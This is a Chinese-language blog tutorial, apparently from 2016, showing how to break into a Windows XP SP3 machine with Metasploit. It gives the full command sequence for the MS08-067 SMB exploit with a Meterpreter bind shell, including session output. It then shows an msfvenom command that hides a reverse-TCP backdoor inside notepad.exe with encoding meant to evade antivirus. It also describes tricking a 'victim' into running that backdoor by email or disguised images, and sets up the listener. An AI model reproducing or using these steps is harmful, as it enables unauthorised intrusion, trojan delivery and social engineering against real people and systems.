---
layout: post
title: 演示使用Metasploit入侵Windows
---

我使用Kali Linux的IP地址是192.168.0.112；在同一局域网内有一台运行Windows XP（192.168.0.108）的测试电脑。

本文演示怎么使用Metasploit入侵windows xp sp3。

启动msfconsole：

{% highlight shell %}
# msfconsole
{% endhighlight %}

![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 15-24-25.png)

选择一个漏洞：

{% highlight shell %}
msf > search platform: windows xp sp3 
{% endhighlight %}

![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 17-17-46.png)

exploit/windows/smb/ms08_067_netapi是08年发现的漏洞，等级Great。

查看某个漏洞的详细信息；包含使用方法、支持的平台等等，非常有帮助：

{% highlight shell %}
msf > info exploit/windows/smb/ms08_067_netapi
{% endhighlight %}

![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 17-24-32.png)

依次执行如下命令：

{% highlight shell %}
msf > use exploit/windows/smb/ms08_067_netapi
> set payload windows/meterpreter/bind_tcp
> set RHOST 192.168.0.108  (设置目标主机IP地址)
> exploit
{% endhighlight %}

如果目标主机有这个漏洞的话，你就可以控制它了；如果没有，尝试使用其他漏洞。

```
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese
[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (751104 bytes) to 192.168.0.108
[*] Meterpreter session 1 opened (192.168.0.1:41614 -> 192.168.0.108:4444) at 2016-04-15 17:29:32

meterpreter >
```

现在你就可以控制目标主机了，可以截屏、录音、视频、下载文件、杀进程等等；使用help查看可以执行的命令。

****

## 演示使用后门程序侵入Windows

原理：在Kali Linux上生成后门程序，然后把它发送给受害者，欺骗受害者运行（使用邮件、图片等等）。难点是需要过杀毒软件和防火墙。

生成后门程序：

我把后门程序隐藏到记事本程序中：notepad.exe

查看Kali Linux的IP：ifconfig（192.168.0.112）

创建后门程序，my_backdoor.exe：

{% highlight shell %}
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4445 -x NOTEPAD.EXE -e x86/jmp_call_additive -i 4 -k -f exe > my_backdoor.exe
{% endhighlight %}

![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 18-24-42.png)

上面命令使用加密试图躲过杀毒软件，但是，不要期望它可以生效。使用man msfvenom查看帮助。

把它发送到Windows系统，并运行；如果不能运行换用其他加密方式。

启动msfconsole：

{% highlight shell %}
# msfconsole
{% endhighlight %}

```
use exploit/multi/handler

set LHOST 192.168.0.112
set LPORT 4445
set payload windows/meterpreter/reverse_tcp
show options
exploit
```

等待受害者启动后门程序。

![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 19-01-13.png)

OK，入侵成功。

![msfconsole]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-15 19-08-43.png)

****

[Metasploit的基本使用](http://topspeedsnail.com/kali-linux-metasploit-base-use/)

[演示使用Metasploit入侵Android](http://topspeedsnail.com/kali-linux-metasploit-hack-android/)